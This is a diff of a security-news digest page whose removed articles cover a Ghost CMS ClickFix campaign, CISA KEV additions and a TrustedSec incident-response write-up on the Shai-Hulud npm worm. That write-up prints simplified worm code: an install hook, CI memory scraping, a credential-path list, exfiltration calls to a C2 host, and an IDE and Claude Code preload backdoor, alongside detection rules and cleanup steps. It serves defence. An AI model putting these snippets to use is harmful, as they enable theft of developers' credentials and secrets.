-The injected JavaScript code at the bottom of an article functions as a two-stage loader that's responsible for retrieving the main payload at runtime from an external domain ("clo4shara[.]xyz/11z77u3.php"). This architecture offers added flexibility as it enables the threat actor to swap out the payloads based on different criteria, while keeping the loader functionality intact across several compromised sites.
-"Directly accessing clo4shara[.]xyz/11z77u3.php reveals a piece of code, which is actually a typical traffic distribution script," XLab explained. "Its core function is to collect various fingerprint information from the user's browser and upload it to the server, then perform actions such as redirection, popups, and downloads based on the returned instructions." The PHP script is powered by [Adspect](https://thehackernews.com/2026/03/tax-search-ads-deliver-screenconnect.html), a commercial cloaking service.
-The idea behind using the cloaking script is to ensure that only real victims are served the actual payload, while security scanners and crawlers will only see a benign web page. The script also supports 19 different commands to run arbitrary JavaScript code and facilitate remote control of the victim's browser.
-Site visitors deemed as the intended targets are ultimately served a fake CAPTCHA verification page within an iframe HTML element to prove they are human. This, in turn, triggers a ClickFix attack, as part of which they are instructed to copy and paste a Base64-encoded command into the Windows Run dialog.
-The command serves as a dropper for delivering a ZIP archive and extracts from it a Windows batch script and runs it. The script, for its part, executes a PowerShell command to download a DLL file from a remote domain, launch it using "rundll32.exe," and open a bogus web page to the user as a distraction.
-Subsequent iterations of the malware have been found to replace the DLL with a JavaScript payload. Regardless of the type of the payload, the end goal of the attack is to drop a Windows executable. In the case of the DLL, the executable is a PuTTY client with a valid code-signing certificate. The binary distributed via JavaScript is an Inno Setup installer for an Electron application.
-The application is a modified version of the open-source [Grape desktop client](https://github.com/ubergrape/grape-electron) that's designed to achieve persistence and poll a remote server ("web-telegram[.]ug") every 30 seconds to process instructions issued by the attacker, including running JavaScript code or executable files.
-Ghost CMS users are advised to upgrade their instances to the latest version, rotate all credentials, clean up the sites, audit access logs for signs of suspicious activity, and notify users who may have visited the sites during the contamination period for potential compromise.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">CISA Adds Exploited Langflow and Trend Micro Apex One Vulnerabilities to KEV</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/05/cisa-adds-exploited-langflow-and-trend.html" target="_blank">Original Link</a></p>
             <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday [added](https://www.cisa.gov/news-events/alerts/2026/05/21/cisa-adds-two-known-exploited-vulnerabilities-catalog) two security flaws impacting Langflow and Trend Micro Apex One to its Known Exploited Vulnerabilities ([KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)) catalog, citing evidence of active exploitation.
@@ -261,668 +624,6 @@ As for CVE-2026-34926, Trend Micro [said](https://success.trendmicro.com/en-US/s
 "This vulnerability is only exploitable on the on-premise version of Apex One and a potential attacker must have access to the Apex One Server and already obtained administrative credentials to the server via some other method to exploit this vulnerability," it added.
 In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies are required to apply the necessary fixes by June 4, 2026, to secure their networks.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">CISA Adds Two Known Exploited Vulnerabilities to Catalog</h2>
-            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/05/21/cisa-adds-two-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
-            <div class="content-text">CISA Adds Two Known Exploited Vulnerabilities to Catalog
-CISA has added two new vulnerabilities to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
-[CVE-2025-34291](https://www.cve.org/CVERecord?id=CVE-2025-34291)Langflow Origin Validation Error Vulnerability[CVE-2026-34926](https://www.cve.org/CVERecord?id=CVE-2026-34926)Trend Micro Apex One (On-Premise) Directory Traversal Vulnerability
-These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.
-[Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
-Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
-This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Shai-Hulud Is Back, and This Time It Ate the Whole Ecosystem</h2>
-            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/shai-hulud-is-back" target="_blank">Original Link</a></p>
-            <div class="content-text">Shai-Hulud Is Back, and This Time It Ate the Whole Ecosystem
-Table of contents
-The name Shai-Hulud is not new to anyone who's been watching npm supply chain attacks over the past few years, or has heard me sound like a broken record in threat intel reports and when warning customers about gaps in software inventory and processes when building playbooks. It's the same worm, but a different wave.
-What changed this time is the blast radius of over 300 packages across Alibaba's AntV data visualization ecosystem, and at the time of this writing, the count is still climbing. The nasty touch of setting a dead-man switch to delete the root folder was one that I will be adding to Tabletop Exercises and will make some organizations think twice when doing rapid isolation.
-1.1 What Actually Happened
-All it took was one (1) npm account. The atool account, which owns the popular timeago.js package (around 1.5 million weekly downloads) and publishes across a large chunk of the @antv namespace, got compromised. Whoever did this pushed malicious versions across charting libraries, graph tools, mapping components, and general-purpose utilities, the whole suite of packages. Anything that pulls from AntV is in scope, from front-end teams to data visualization pipelines. This will be the hardest part for many out there, as your perimeter logs will be king when hunting for hosts to inspect,in addition to the use of EDR and other tools that allow you to script or leverage built-in string searches.
-The attacker didn't try to hide the impact, with over 2,200 public GitHub repositories created using stolen tokens. Each one was named with Dune-universe terminology, described with the reversed string "niagA oG eW ereH :duluH-iahS." Flip that around: "Shai-Hulud: Here We Go Again." They're announcing themselves in real time, using the credentials they just stole. That is not accidental, it is someone making a point. With how well orchestrated the attack is, I cannot say this is sloppy but intentional.
-Any environment that installed an affected package should be treated as fully compromised. Rotate everything now, before you finish reading this.
-High-impact packages by download volume:
-Package | Compromised Versions |
-|---|---|
-timeago.js | 4.1.2, 4.2.2 |
-echarts-for-react | 3.0.7, 3.1.7, 3.2.7 |
-jest-canvas-mock | 2.5.3, 2.6.3, 2.7.3 |
-@antv/g6 | 5.2.1, 5.3.1 |
-@antv/g2 | 5.5.8, 5.6.8 |
-@antv/l7 | 2.26.10, 2.27.10 |
-mcp-echarts | 0.8.1, 0.9.1 |
-mcp-mermaid | 0.5.1, 0.6.1 |
-The full list at the end and it keeps growing. I still recommend you perform a threat hunt for the indicators of compromise (IOCs)).
-1.2 How the Malware Works
-This second time around, we see the same payload across every compromised package, just differently obfuscated (note that this does not mean it has not changed recently). The entry point is either a preinstall or postinstall hook. Execution fires the moment npm install runs, which happens before anything in your codebase loads.
-1.2.1 Stage 1 The Install Hook
-{
-"scripts": {
-"preinstall": "node -e \"require('./.build/preinstall.js')\""
-}
-}
-The .build/preinstall.js is heavily obfuscated and is worth deobfuscating if you're doing forensic work on a hit system. Once unpacked, behavior runs three (3) tracks:
-- Credential harvesting
-- Exfiltration
-- Persistence
-1.2.2 Stage 2 Pulling Secrets Out of Runner Memory
-GitHub Actions masks secrets in log output, but what it can't stop is a process on the same runner reading its own process memory. The payload does exactly that—it walks /proc/self/maps, locates the heap regions where ACTIONS_-prefixed environment variables live, and reads the unmasked values directly out of memory.
-// Simplified representation of the runner memory scraping logic
-const fs = require('fs');
-const path = `/proc/${process.pid}/mem`;
-function readMaskedSecrets() {
-// Reads /proc/self/maps to find memory ranges
-// Then walks mapped regions looking for ACTIONS_ prefixed env vars
-// Extracts their unmasked values from heap memory
-const maps = fs.readFileSync('/proc/self/maps', 'utf8');
-const ranges = parseMappings(maps);
-return harvestFromRanges(ranges);
-}
-Your Continuous Integration (CI) logs will look clean because the secret extraction happens below the log layer entirely. This is why rotation is a must. The problem is that many organizations don't have a good ledger of secrets per host, which is why I recommend that you de-obfuscate any package found, review its harvesting routines, and use that as a base to do impact analysis.
-1.2.3 Stage 3 Sweeping the Filesystem
-Beyond runner memory, the payload scans 130+ file paths. It's a thorough list—the samples we have seen at TrustedSec cover cloud provider configs, container orchestration, secrets managers, SSH keys, crypto wallets, and developer tooling.
-const CREDENTIAL_PATHS = [
-// AWS
-'~/.aws/credentials',
-'~/.aws/config',
-// GCP
-'~/.config/gcloud/credentials.db',
-'~/.config/gcloud/application_default_credentials.json',
-// Azure
-'~/.azure/accessTokens.json',
-'~/.azure/azureProfile.json',
-// Kubernetes
-'~/.kube/config',
-// HashiCorp Vault
-'~/.vault-token',
-// npm
-'~/.npmrc',
-// Generic credential stores
-'~/.netrc',
-'~/.ssh/id_rsa',
-'~/.ssh/id_ed25519',
-// Cryptocurrency wallets
-'~/.bitcoin/wallet.dat',
-'~/.ethereum/keystore',
-// Docker
-'~/.docker/config.json',
-];
-Developer ran npm install locally? Same story. If those paths exist on the machine, that data got nabbed by the attacker. The attacker will automate some testing and then come back to fully leverage those secrets.
-1.2.4 Stage 4 Getting the Data Out
-Two (2) exfiltration channels are being used. The primary path uses the GitHub API to write into a file inside the legitimate antvis/G2 repository. Think of it as a dead-drop that blends into normal GitHub API traffic, because it technically is normal GitHub API traffic, just pointed at a repo the attacker now controls through stolen tokens.
-// Primary exfiltration GitHub API dead-drop
-async function exfiltrateViaGitHub(payload) {
-const encoded = Buffer.from(JSON.stringify(payload)).toString('base64');
-await fetch('https://api.github.com/repos/antvis/G2/contents/.telemetry', {
-method: 'PUT',
-headers: {
-'Authorization': `token ${stolenGitHubToken}`,
-'Content-Type': 'application/json',
-},
-body: JSON.stringify({
-message: 'chore: update telemetry',
-content: encoded,
-}),
-});
-}
-// Fallback C2 disguised as OpenTelemetry
-async function exfiltrateViaC2(payload) {
-await fetch('https://t.m-kosche.com/v1/traces', {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify(payload),
-});
-}
-The fallback is t.m-kosche[.]com, dressed up as an OpenTelemetry collector. If you have egress monitoring (you do, right?), that domain is your IOC. Block it and alert on it.
-1.2.5 Stage 5 Persistence
-Here's what separates a bad day from a bad month. The payload doesn't just steal and leave, it drops persistent backdoors into VS Code and Claude Code configurations. The mechanism is a Node.js preload file wired into terminal.integrated.env settings. Every node process the developer spawns afterward runs attacker code first.
-// VS Code settings.json backdoor
-const vscodeConfig = {
-"terminal.integrated.env.linux": {
-"NODE_OPTIONS": "--require /tmp/.node_preload.js"
-}
-};
-// Claude Code config backdoor (~/.claude/config.json or similar)
-// Injects a persistent hook into the AI assistant's tool execution context
-Rotating credentials without cleaning this first means the malware runs again the next time that developer opens a terminal. Credential rotation is step one (1). Backdoor removal is step two (2). You need both or you haven't remediated, plus you will need constant monitoring to ensure re-infection does not happen.
-1.3 Detecting Compromise
-1.3.1 Lock File Audit
-Let the hunting begin. Cross-reference your package-lock.json or yarn.lock against the known-compromised version list.
-# Check for known compromised timeago.js versions
-npm ls timeago.js 2>/dev/null | grep -E "4\.1\.2|4\.2\.2"
-# Broad scan of your lock file for compromised @antv packages
-grep -E '"@antv/' package-lock.json | grep -E '"version": "(.*\.[13]\.[0-9]+|.*\.[12]\.[0-9]+)"'
-# More targeted check for the specific version bump pattern (+1 minor)
-# Compromised versions follow a consistent pattern: x.y.z and x.(y+1).z
-This is why we ask customers if they deploy EDR even on Linux and have practiced hunting when we onboard them for Incident Response retainers. It is an inject we use often in Tabletop Exercises.
-1.3.2 Hunt for Backdoor Artifacts
-Check the locations the worm sets for persistence for IOCs.
-# Check for the node preload backdoor
-ls -la /tmp/.node_preload.js
-ls -la ~/.node_preload.js
-find /tmp -name "*.js" -newer /tmp -mtime -7 2>/dev/null
-# VS Code config tampering
-cat ~/.config/Code/User/settings.json | grep -i "NODE_OPTIONS\|terminal.integrated.env"
-cat ~/Library/Application\ Support/Code/User/settings.json | grep -i "NODE_OPTIONS"
-# Claude Code config
-cat ~/.claude/config.json 2>/dev/null | grep -i "preload\|NODE_OPTIONS\|require"
-# npm preinstall hooks in recently installed packages
-find node_modules -name "package.json" | xargs grep -l "preinstall\|postinstall" 2>/dev/null
-1.3.3 Network Indicators
-POST traffic to t.m-kosche[.]com, GitHub API calls that don't trace back to a known CI run, or developer workflow are your tells. If you have DNS query logs available, run them.
-# On Linux, check current connections
-ss -tnp | grep -E "t\.m-kosche\.com|api\.github\.com"
-# DNS query logs (if you have them)
-grep "m-kosche" /var/log/syslog 2>/dev/null
-grep "m-kosche" /var/log/dns.log 2>/dev/null
-# Check recently created GitHub repos with the Dune naming pattern
-# (Requires a GitHub token with org-level read access)
-curl -H "Authorization: token $GITHUB_TOKEN" \
-"https://api.github.com/user/repos?sort=created&direction=desc&per_page=50" | \
-jq '.[] | select(.description | test("niagA oG")) | {name, html_url, created_at}'
-If you have F5, Zscaler, etc., check those logs. Perimeter logging is king in these cases because it will provide the target list for the hunt.
-1.3.4 CI Log Review
-Any runner that pulled an affected package during the compromised window is suspect. Pull workflow logs from that period and look for unexpected child processes, unusual network calls, and any node invocations you can't account for in your defined steps.
-# GitHub Actions: check recent runs that touched affected packages
-gh run list --limit 50 --json databaseId,conclusion,createdAt,headBranch \
-| jq '.[] | select(.createdAt > "2026-05-15")'
-1.4 Cleanup
-1.4.1 Step 1 Downgrade and Pin Affected Packages
-Do this for every affected package in the dependency tree, not just direct dependencies. Transitive packages count too.
-# Remove the compromised version
-npm uninstall timeago.js
-# Install the last known-good version
-npm install timeago.js@4.1.1
-# Lock it down in package.json no more caret ranges for this package
-# Change: "timeago.js": "^4.1.1"
-# To: "timeago.js": "4.1.1"
-1.4.2 Step 2 Rotate All Exposed Credentials
-Work the list methodically. Don't skip anything that could have been in scope based on the credential paths targeted by the payload. Remember: do this after you have found and removed the packages—you do not want to trigger a dead-man switch.
-# AWS
-aws iam create-access-key --user-name <your-user>
-aws iam delete-access-key --access-key-id <old-key>
-# GitHub rotate any PATs or fine-grained tokens
-# Go to: Settings > Developer settings > Personal access tokens
-# npm tokens
-npm token revoke <token>
-npm token create --read-only # or with publish if needed
-# Kubernetes
-kubectl config view --raw | grep "token:"
-# Rotate through your cloud provider's IAM console
-Don't forget to revoke and rotate SSH keys/certs.
-Here is what we found in one (1) of the samples the code used to find credentials and we can see here the locations it searches. We have seen variations where it searches for other types.
-constructor() {
-super("kubernetes", "secrets", {
-ghtoken: /gh[op]_[A-Za-z0-9_\-\.]{36,}/g,
-npmtoken: /npm_[A-Za-z0-9_\-\.]{36,}/g,
-k8stoken: /eyJhbGciOiJSUzI1NiIsImtpZCI6[\w\-\.]+/g,
-awskey:
-…
-sshKey: /ssh-(rsa|ed25519|dss) AAAA[0-9A-Za-z+\/]{100,}/g,
-dockerAuth: /"auth":\s*"[A-Za-z0-9+\/=]{20,}"/g,
-kubeconfig: /[A-Za-z0-9+/=]{20,}/g,
-secret:
-/["']?(password|passwd|pass|pwd|secret|token|key|api[_-]?key|auth)["']?\s*["':=]\s*["'][^"'{}\s]{4,}["']/gi,
-genericSecret: /[A-Za-z0-9_\-\.]{20,}/g,
-urlCred: /https?:\/\/[^:"'\s]+:[^@"'\s]+@[^\s'"\]]+/g,
-});
-}
-private isInCluster(): boolean {
-return !!process.env.KUBERNETES_SERVICE_HOST;
-}
-private async getCA(): Promise<Buffer | null> {
-const caPath = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt";
-1.4.3 Step 3 Pull the Backdoors
-# Clean node preload artifacts
-rm -f /tmp/.node_preload.js ~/.node_preload.js
-# Review and restore VS Code settings
-code --list-extensions # verify no unexpected extensions
-# Manually review ~/.config/Code/User/settings.json
-# Remove any NODE_OPTIONS or unexpected terminal env vars
-# Claude Code config
-# Review and restore ~/.claude/config.json to a known-good state
-# Check .npmrc for injected registry overrides
-cat ~/.npmrc
-cat $(npm root -g)/../../../.npmrc 2>/dev/null
-1.4.4 Step 4 Rebuild Self-Hosted Runners
-Don't try to remediate a runner that executed a compromised install. Tear it down and rebuild from a verified clean image. GitHub-hosted runners are ephemeral, so that's a non-issue, but self-hosted is a different story. Anything that was in scope when you identified developer hosts and what perimeter logs told you gets treated as fully owned and rebuilt.
-1.5 Auditd Rules for Linux Systems
-Running Linux-based build systems or developer workstations? Drop these into /etc/audit/rules.d/supply-chain.rules. They cover the specific behaviors this malware exhibits: credential file reads, proc memory scraping, /tmp dropper writes, node preload injection, and configuration directory tampering.
-# Monitor reads of credential files commonly targeted by supply chain malware
--w /root/.aws/credentials -p r -k supply_chain_cred_access
--w /root/.aws/config -p r -k supply_chain_cred_access
--w /home -p r -k supply_chain_home_access
--w /root/.kube/config -p r -k supply_chain_cred_access
--w /root/.vault-token -p r -k supply_chain_cred_access
--w /root/.npmrc -p r -k supply_chain_cred_access
--w /root/.docker/config.json -p r -k supply_chain_cred_access
--w /root/.netrc -p r -k supply_chain_cred_access
--w /root/.ssh/id_rsa -p r -k supply_chain_ssh_access
--w /root/.ssh/id_ed25519 -p r -k supply_chain_ssh_access
-# Monitor /proc/self/maps access (memory scraping technique)
--a always,exit -F arch=b64 -S open,openat -F path=/proc/self/maps -k proc_mem_scrape
--a always,exit -F arch=b64 -S open,openat -F path=/proc/self/mem -k proc_mem_scrape
-# Monitor writes to /tmp (dropper behavior)
--a always,exit -F arch=b64 -S open,openat,creat -F dir=/tmp -F success=1 -k tmp_write
-# Monitor execution of node with --require flag (preload injection)
--a always,exit -F arch=b64 -S execve -F path=/usr/bin/node -k node_exec
--a always,exit -F arch=b64 -S execve -F exe=/usr/bin/node -k node_exec
-# Monitor outbound connections from node processes (exfiltration)
--a always,exit -F arch=b64 -S connect -F comm=node -k node_network_connect
-# Monitor changes to VS Code and Claude Code config directories
--w /root/.config/Code -p w -k dev_config_tamper
--w /root/.claude -p w -k dev_config_tamper
-# Monitor npm install script execution
--a always,exit -F arch=b64 -S execve -F path=/usr/bin/npm -k npm_exec
--a always,exit -F arch=b64 -S execve -F path=/usr/local/bin/npm -k npm_exec
-Load and verify:
-augenrules --load
-systemctl restart auditd
-# Verify rules loaded
-auditctl -l | grep supply_chain
-Querying logs:
-# Check for credential file reads
-ausearch -k supply_chain_cred_access -ts today | aureport -f
-# Check for proc memory access attempts
-ausearch -k proc_mem_scrape -ts today
-# Check for /tmp dropper activity
-ausearch -k tmp_write -ts today | grep -v "known-good-process"
-# Check for node preload executions
-ausearch -k node_exec -ts today | grep -i "require\|preload"
-1.6 What to Change Going Forward
-1.6.1 npm Provenance—Use It
-Provenance is genuinely underused. A package published with it carries a signed attestation that ties it back to the exact source repo and CI workflow that built it. This is a very meaningful verification step, especially for packages sitting in high-trust positions in your pipeline.
-# Check if a package has provenance
-npm pack --dry-run timeago.js | grep -i provenance
-# Or view it on the registry
-npm info timeago.js dist.attestations
-# Enforce provenance verification in your project
-# In .npmrc:
-# audit-signatures=true
-Sadly, it is not universal yet, but the coverage is growing. If something you depend on doesn't have provenance and it's wired into your CI, track that as a risk. Developers will push back. I've been in calls as the security team is cleaning up, and they will push back, arguing that it is a lot of work.
-1.6.2 Actually, Pin Your Dependencies
-Caret ranges are convenient and a real liability. "timeago.js": "^4.1.1" silently accepts 4.2.2 with no action required from you, which is exactly how this campaign slid the malicious version onto systems running routine updates.
-# Audit your package.json for caret and tilde ranges on sensitive deps
-cat package.json | jq '.dependencies | to_entries[] | select(.value | startswith("^") or startswith("~"))'
-# Pin everything
-npm shrinkwrap # creates npm-shrinkwrap.json with exact versions
-# Or use the --save-exact flag when installing
-npm install --save-exact timeago.js@4.1.1
-In CI, use npm ci instead of npm install. This installs exactly what's in the lock file, and fails hard on any discrepancy.
-# Use this in CI, not npm install
-npm ci
-1.6.3 Disable Install Scripts by Default
-Most front-end packages have no business running code at install time. ignore-scripts=true in your .npmrc shuts the install hook vector down entirely.
-# .npmrc
-ignore-scripts=true
-Packages that legitimately need install scripts native bindings can be explicitly allowlisted. Everything else gets blocked by default.
-# Check which packages in your tree actually need install scripts
-npx can-i-ignore-scripts
-Tools like socket.dev will also flag suspicious install hooks before they run, which is worth adding to the signal stack.
-1.6.4 Block the C2 Domain
-Add t.m-kosche.com to your DNS denylist or NGFW deny rules. Anything reaching out to it is an immediate indicator.
-# Quick hosts file block on Linux
-echo "0.0.0.0 t.m-kosche.com" >> /etc /hosts
-# Or via iptables with logging
-iptables -A OUTPUT -d t.m-kosche.com -j DROP
-iptables -A OUTPUT -d t.m-kosche.com -j LOG --log-prefix "SHAI-HULUD-C2-BLOCK: "
-I would also recommend considering a different package manager like [PNPM](https://pnpm.io/) that has mitigations for these types of attacks. Here is a good starting .npmrc configuration to implement these defenses:
-# PNPM 11 Security Mitigation Configuration
-# 1. Minimum Release Age
-# Refuses to install any package published less than 24 hours ago.
-# This prevents the installation of "day-zero" poisoned updates before they are detected.
-min-package-age=24h
-# 2. Block Exotic Sub-dependencies
-# Disallows transitive dependencies that point to random Git repos or external URLs.
-# Forces all dependencies to come from a verified registry (like npm).
-block-exotic-dependencies=true
-# 3. Approved Builds (Install Script Security)
-# PNPM 11 blocks all install scripts by default to prevent malware execution.
-# You must manually whitelist trusted packages that require scripts to run.
-# This setting ensures the default "blocked" behavior is strictly enforced.
-only-built-dependencies=[]
-How these settings work together:
-- Minimum Release Age: In the TanStack attack, the 84 poisoned packages were published rapidly; this setting would have caused PNPM to refuse the installation for the first 24 hours, likely outlasting the time it took for the security community to flag and remove them.
-- Block Exotic Sub-dependencies: This closes a "smuggling" loophole by ensuring that every part of your dependency tree comes from a proper registry rather than an attacker's private server or a random GitHub fork.
-- Approved Builds: Because most npm malware, including the Shai-Hulud worm, relies on automatic install scripts to execute its payload, blocking these scripts by default is your strongest defense. When you encounter a package that legitimately needs an install script, PNPM 11 allows you to walk through your dependencies and allowlist only those specific trusted packages.
-1.7 Closing
-What makes this campaign work isn't sophistication, it's strategic positioning. A single compromised maintainer account with the right namespace access becomes 300+ poisoned packages and 59 million monthly downloads in scope. Developers doing exactly what they're supposed to do, keeping dependencies current, end up pulling the malicious version. That's a structural problem, and hygiene alone doesn't solve it.
-The controls here are layered on purpose. Pinning doesn't save you if you were already on a compromised version. Provenance helps, but only if you're checking it consistently. Auditd gives you forensic visibility after the fact, which matters when you're trying to scope what was touched. None of these is a full answer on its own. PNPM gives you the best mitigation, but it means changing your workflow and tooling to support it.
-Memory scraping against masked runner secrets, GitHub API dead-drops, OpenTelemetry impersonation for C2, and IDE backdoors that survive a credential rotation are solid tradecraft. The fact that the attacker is signing their work in repo descriptions doesn't make it less dangerous, it makes it more deliberate.
-Rotate your secrets. Audit your lock files. Pin your dependencies. Rebuild any self-hosted runner that was in scope. Assume the worst and work the problem from there.
-1.8 Shai-Hulud IOC Reference Tables
-1.8.1 Table 1 Files to Monitor
-This list comes from payload analysis of the deobfuscated Shai-Hulud malware. The payload scans 130+ paths on the host filesystem. Files marked Dropper/Backdoor are artifacts the payload writes; all others are read targets for credential theft.
-File Path | Category | Access Type | Notes |
-|---|---|---|---|
-/etc /hosts | System | Write | Attacker may poison DNS resolution to redirect registry traffic |
-/proc/[pid]/mem | Process Memory | Read | Runner.Worker memory scrape primary CI secret extraction technique |
-/proc/[pid]/cmdline | Process Memory | Read | Used to locate the Runner.Worker PID before memory read |
-/proc/self/maps | Process Memory | Read | Maps heap regions before reading unmasked secrets |
-/tmp/.node_preload.js | Dropper/Backdoor | Write | Persistent node preload survives credential rotation |
-~/.node_preload.js | Dropper/Backdoor | Write | Alternate preloads drop location |
-~/.aws/credentials | Cloud AWS | Read | Primary AWS credential file |
-~/.aws/config | Cloud AWS | Read | AWS region/profile config, may contain role ARNs |
-~/.config/gcloud/credentials.db | Cloud GCP | Read | GCP OAuth token store |
-~/.config/gcloud/application_default_credentials.json | Cloud GCP | Read | GCP ADC credentials used by SDKs |
-~/.azure/accessTokens.json | Cloud Azure | Read | Azure CLI cached access tokens |
-~/.azure/azureProfile.json | Cloud Azure | Read | Azure subscription and tenant info |
-~/.kube/config | Kubernetes | Read | Kubeconfig may contain cluster admin tokens |
-~/.vault-token | HashiCorp Vault | Read | Vault root or service token |
-~/.npmrc | Package Manager | Read | npm auth tokens and registry config |
-~/.yarnrc.yml | Package Manager | Read | Yarn auth tokens |
-~/.docker/config.json | Container | Read | Docker registry auth tokens |
-~/.netrc | Generic Credentials | Read | FTP/HTTP credential store used by many CLI tools |
-~/.ssh/id_rsa | SSH | Read | RSA private key |
-~/.ssh/id_ed25519 | SSH | Read | Ed25519 private key (most common modern key type) |
-~/.ssh/id_ecdsa | SSH | Read | ECDSA private key |
-~/.ssh/id_dsa | SSH | Read | DSA private key (legacy) |
-~/.gitconfig | Developer Tooling | Read | May contain credential helper configuration or tokens |
-~/.config/gh/hosts.yml | Developer Tooling | Read | GitHub CLI stored tokens |
-~/.config/Code/User/settings.json | Backdoor Target | Read/Write | VS Code settings NODE_OPTIONS backdoor injected here (Linux) |
-~/Library/Application Support/Code/User/settings.json | Backdoor Target | Read/Write | VS Code settings NODE_OPTIONS backdoor injected here (macOS) |
-~/.claude/config.json | Backdoor Target | Read/Write | Claude Code configuration persistent hook injection target |
-~/.bitcoin/wallet.dat | Cryptocurrency | Read | Bitcoin wallet |
-~/.ethereum/keystore | Cryptocurrency | Read | Ethereum keystore directory |
-~/.config/solana/id.json | Cryptocurrency | Read | Solana keypair |
-~/.gnupg/ | Cryptography | Read | GPG keyring signing keys for releases/commits |
-~/.pypirc | Package Manager | Read | PyPI auth tokens |
-~/.gem/credentials | Package Manager | Read | RubyGems auth token |
-~/.m2/settings.xml | Package Manager | Read | Maven credentials |
-~/.gradle/gradle.properties | Package Manager | Read | Gradle credentials |
-~/.cargo/credentials.toml | Package Manager | Read | crates.io auth token |
-/home/*/.aws/credentials | Cloud AWS | Read | Sweep of all user home directories |
-/home/*/.ssh/id_rsa | SSH | Read | Sweep of all user SSH keys |
-/root/.aws/credentials | Cloud AWS | Read | Root user AWS credentials (CI runners often run as root) |
-/root/.kube/config | Kubernetes | Read | Root kubeconfig (common in containerized CI) |
-1.8.2 Table 2 Compromised npm Packages
-The full list was sourced from StepSecurity and OX Security reports (May 19, 2026). Again, I would still hunt since this list may be outdated by the time you read this post. The attack targeted packages maintained by the atool npm account across the AntV ecosystem and associated libraries. Combined monthly downloads exceed 59 million. The list continues to grow as the investigation is ongoing.
-Package | Compromised Versions | Category |
-|---|---|---|
-timeago.js | 4.1.2, 4.2.2 | Utility |
-timeago-react | 3.1.7, 3.2.7 | Utility |
-echarts-for-react | 3.0.7, 3.1.7, 3.2.7 | Charting |
-jest-canvas-mock | 2.5.3, 2.6.3, 2.7.3 | Testing |
-jest-date-mock | 1.0.11, 1.1.11, 1.2.11 | Testing |
-size-sensor | 1.0.4, 1.1.4, 1.2.4 | Utility |
-canvas-nest.js | 2.1.4, 2.2.4 | UI |
-filesize.js | 2.1.0, 2.2.0 | Utility |
-onfire.js | 2.1.1, 2.2.1 | Utility |
-relationship.js | 1.3.9, 1.4.9 | Utility |
-ribbon.js | 1.1.2 | UI |
-slice.js | 1.2.1, 1.3.1 | Utility |
-word-width | 1.1.1, 1.2.1 | Utility |
-lint-md | 0.3.0, 0.4.0 | Linting |
-lint-md-cli | 0.2.2, 0.3.2 | Linting |
-mcp-echarts | 0.8.1, 0.9.1 | MCP Server |
-mcp-mermaid | 0.5.1, 0.6.1 | MCP Server |
-@antv/adjust | 0.3.5, 0.4.5 | AntV Core |
-@antv/algorithm | 0.2.26, 0.3.26 | AntV Core |
-@antv/async-hook | 2.3.9, 2.4.9 | AntV Core |
-@antv/attr | 0.4.5, 0.5.5 | AntV Core |
-@antv/ava | 3.5.1, 3.6.1 | AntV AVA |
-@antv/ava-react | 3.4.2, 3.5.2 | AntV AVA |
-@antv/color-util | 2.1.6, 2.2.6 | AntV Core |
-@antv/component | 2.2.11, 2.3.11 | AntV Core |
-@antv/coord | 0.5.7, 0.6.7 | AntV Core |
-@antv/data-set | 0.12.8, 0.13.8 | AntV Core |
-@antv/dom-util | 2.1.4, 2.2.4 | AntV Core |
-@antv/event-emitter | 0.2.3, 0.3.3 | AntV Core |
-@antv/expr | 1.1.2, 1.2.2 | AntV Core |
-@antv/f-engine | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f-lottie | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f-my | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f-react | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f-test-utils | 1.1.9, 1.2.9 | AntV F2 Mobile |
-@antv/f-vue | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f-wx | 1.11.0, 1.12.0 | AntV F2 Mobile |
-@antv/f2 | 5.15.0, 5.16.0 | AntV F2 Mobile |
